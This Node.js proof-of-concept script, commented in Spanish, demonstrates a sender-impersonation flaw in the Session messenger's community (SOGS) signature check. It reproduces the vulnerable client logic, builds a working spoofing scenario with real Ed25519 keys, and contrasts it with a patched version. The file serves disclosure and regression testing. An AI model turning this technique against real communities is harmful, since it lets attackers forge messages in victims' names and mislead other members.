/**
 * PoC ZD-4 — Suplantación de remitente en comunidades (SOGS v4):
 * la firma Ed25519 se valida por entrada, pero la atribución se hace buscando
 * por el string `data`, no por el índice de la entrada validada.
 *
 * Código real afectado:
 *   - ts/session/apis/open_group_api/sogsv3/sogsApiV3.ts:146  filterOutMessagesInvalidSignature()
 *   - ts/webworker/workers/node/util/util.worker.ts:94         verifyAllSignatures()
 *
 * Se firma de verdad con Ed25519 (mismo esquema que `verifySignature`:
 * pubkey raw de 32 bytes, prefijo "05"/"15"/"25" fuera, firma detached sobre los
 * bytes de `data`).
 *
 * Ejecutar: node security-poc/04_sogs_signature_dealias.mjs
 */
import { createHash, generateKeyPairSync, sign as edSign, verify as edVerify, createPublicKey } from 'node:crypto';

// ---------- utilidades cripto equivalentes a ts/session/crypto/signature.ts ----------
const SPKI_ED25519_PREFIX = Buffer.from('302a300506032b6570032100', 'hex');

function newKeyPair() {
  const { publicKey, privateKey } = generateKeyPairSync('ed25519');
  const raw = publicKey.export({ type: 'spki', format: 'der' }).subarray(-32);
  return { rawPub: raw, privateKey };
}

function signDetached(privKey, msgBytes) {
  return edSign(null, msgBytes, privKey);
}

function verifyDetached(rawPub, sig, msgBytes) {
  const key = createPublicKey({
    key: Buffer.concat([SPKI_ED25519_PREFIX, rawPub]),
    format: 'der',
    type: 'spki',
  });
  try {
    return edVerify(null, msgBytes, key, sig);
  } catch {
    return false;
  }
}

const pubkeyToSogsId = (raw, prefix = '15') => `${prefix}${raw.toString('hex')}`;
const b64 = buf => Buffer.from(buf).toString('base64');

// ---------- copia fiel de la lógica del cliente ----------

// ts/webworker/workers/node/util/util.worker.ts:94  (versión VULNERABLE)
function verifyAllSignaturesVulnerable(uncheckedSignatureMessages) {
  const checked = [];
  for (let index = 0; index < uncheckedSignatureMessages.length; index++) {
    const unchecked = uncheckedSignatureMessages[index];
    try {
      const senderRaw = Buffer.from(unchecked.sender.slice(2), 'hex');
      const valid = verifyDetached(
        senderRaw,
        Buffer.from(unchecked.base64EncodedSignature, 'base64'),
        Buffer.from(unchecked.base64EncodedData, 'base64')
      );
      if (valid) {
        checked.push(unchecked.base64EncodedData); // <-- devuelve el PAYLOAD, no el índice
        continue;
      }
      console.info('got an opengroup message with an invalid signature');
    } catch (e) {
      console.error(e);
    }
  }
  return checked.filter(Boolean);
}

// ts/session/apis/open_group_api/sogsv3/sogsApiV3.ts:146 (versión VULNERABLE)
function filterOutMessagesInvalidSignatureVulnerable(messagesFilteredBlindedIds, workerFn) {
  const sentToWorker = messagesFilteredBlindedIds.map(m => ({
    sender: m.session_id,
    base64EncodedSignature: m.signature,
    base64EncodedData: m.data,
  }));
  const signatureValidEncodedData = workerFn(sentToWorker);
  return signatureValidEncodedData
    .map(validData => messagesFilteredBlindedIds.find(m => m.data === validData)) // <-- aliasing por `data`
    .filter(Boolean);
}

// ---------- versión PARCHEADA (ver commit) ----------
function verifyAllSignaturesFixed(uncheckedSignatureMessages) {
  const checkedIndexes = [];
  for (let index = 0; index < uncheckedSignatureMessages.length; index++) {
    const unchecked = uncheckedSignatureMessages[index];
    if (!unchecked?.base64EncodedData || !unchecked?.base64EncodedSignature || !unchecked?.sender) {
      continue;
    }
    try {
      const senderRaw = Buffer.from(unchecked.sender.slice(2), 'hex');
      const valid = verifyDetached(
        senderRaw,
        Buffer.from(unchecked.base64EncodedSignature, 'base64'),
        Buffer.from(unchecked.base64EncodedData, 'base64')
      );
      if (valid) {
        checkedIndexes.push(index); // <-- devuelve el ÍNDICE validado
        continue;
      }
      console.info('got an opengroup message with an invalid signature');
    } catch (e) {
      console.error(e);
    }
  }
  return checkedIndexes;
}

function filterOutMessagesInvalidSignatureFixed(messagesFilteredBlindedIds, workerFn) {
  const sentToWorker = messagesFilteredBlindedIds.map(m => ({
    sender: m.session_id,
    base64EncodedSignature: m.signature,
    base64EncodedData: m.data,
  }));
  const validIndexes = workerFn(sentToWorker);
  return validIndexes
    .map(index => {
      if (!Number.isInteger(index) || index < 0 || index >= messagesFilteredBlindedIds.length) {
        return undefined;
      }
      const candidate = messagesFilteredBlindedIds[index];
      // defensa en profundidad: lo validado y lo atribuido tienen que ser la MISMA entrada
      if (!candidate || sentToWorker[index].base64EncodedData !== candidate.data) {
        return undefined;
      }
      return candidate;
    })
    .filter(Boolean);
}

// ---------- escenario ----------
const victim = newKeyPair();
const attacker = newKeyPair();

const victimId = pubkeyToSogsId(victim.rawPub, '15');
const attackerId = pubkeyToSogsId(attacker.rawPub, '15');

// El payload de una comunidad SOGS es cifrado simétrico con la clave derivada de la
// pubkey del servidor: cualquier miembro (y el servidor) puede copiar el blob exacto.
const ciphertext = Buffer.from(
  'This message is encrypted with the community server key, so its bytes are public.'
);
const dataB64 = b64(ciphertext);

// El atacante firma SU copia del blob con SU clave: firma criptográficamente válida.
const attackerSignature = b64(signDetached(attacker.privateKey, ciphertext));

// La respuesta del servidor (orden ascendente por seqno, tal como la deja el cliente):
const serverResponse = [
  {
    id: 101,
    seqno: 101,
    posted: 1_700_000_000,
    session_id: victimId, //        <-- remitente que verá la víctima
    data: dataB64,
    signature: b64(Buffer.alloc(64, 0x41)), // firma inválida para victimId
  },
  {
    id: 102,
    seqno: 102,
    posted: 1_700_000_001,
    session_id: attackerId, //      <-- entrada que SÍ valida
    data: dataB64, //               <-- MISMO blob
    signature: attackerSignature,
  },
];

console.log('--- estado inicial ---');
console.log('victim  :', victimId.slice(0, 14) + '…');
console.log('attacker:', attackerId.slice(0, 14) + '…');
console.log('data (mismo blob en las 2 entradas):', dataB64.slice(0, 24) + '…');
console.log(
  'firma de la entrada 1 (atribuida a la víctima) es válida?',
  verifyDetached(victim.rawPub, Buffer.from(serverResponse[0].signature, 'base64'), ciphertext)
);

const vulnerable = filterOutMessagesInvalidSignatureVulnerable(
  serverResponse,
  verifyAllSignaturesVulnerable
);
console.log('\n=== CLIENTE SIN PARCHEAR ===');
console.log(
  'entradas que pasan el filtro de firma:',
  vulnerable.map(m => `${m.session_id.slice(0, 14)}… (seqno ${m.seqno})`)
);
console.log(
  '=> el mensaje se procesa y se guarda como enviado por:',
  vulnerable[0].session_id === victimId ? 'LA VÍCTIMA  <-- SUPLANTACIÓN' : 'el atacante'
);
console.log(
  '   (source/senderIdentity del SogsDecodedEnvelope =',
  vulnerable[0].session_id.slice(0, 14) + '…)'
);

const fixed = filterOutMessagesInvalidSignatureFixed(serverResponse, verifyAllSignaturesFixed);
console.log('\n=== CLIENTE PARCHEADO ===');
console.log(
  'entradas que pasan el filtro de firma:',
  fixed.map(m => `${m.session_id.slice(0, 14)}… (seqno ${m.seqno})`)
);
console.log(
  '=> el mensaje se atribuye a:',
  fixed.length && fixed[0].session_id === victimId ? 'LA VÍCTIMA  <-- FALLO' : 'el atacante (correcto)'
);

// ---------- variante B: mismo efecto con 2 mensajes legítimos ----------
console.log('\n--- variante B: dos entradas legítimas, mismo blob ---');
const legitVictimSig = b64(signDetached(victim.privateKey, ciphertext));
const twoLegit = [
  { id: 1, seqno: 1, posted: 1, session_id: victimId, data: dataB64, signature: legitVictimSig },
  { id: 2, seqno: 2, posted: 2, session_id: attackerId, data: dataB64, signature: attackerSignature },
];
const vB = filterOutMessagesInvalidSignatureVulnerable(twoLegit, verifyAllSignaturesVulnerable);
console.log(
  'sin parchear, entradas devueltas:',
  vB.map(m => `${m.session_id.slice(0, 14)}…`),
  '(la del atacante desaparece: su firma válida "admite" el mensaje de la víctima)'
);
console.log(
  'parcheado, entradas devueltas:',
  filterOutMessagesInvalidSignatureFixed(twoLegit, verifyAllSignaturesFixed).map(m => `${m.session_id.slice(0, 14)}…`)
);

const exploited = vulnerable.some(m => m.session_id === victimId);
console.log(
  `\nRESULTADO: ${exploited ? 'VULNERABLE — un mensaje con firma inválida es aceptado como enviado por la víctima' : 'no explotable'}`
);
process.exit(exploited ? 0 : 1);
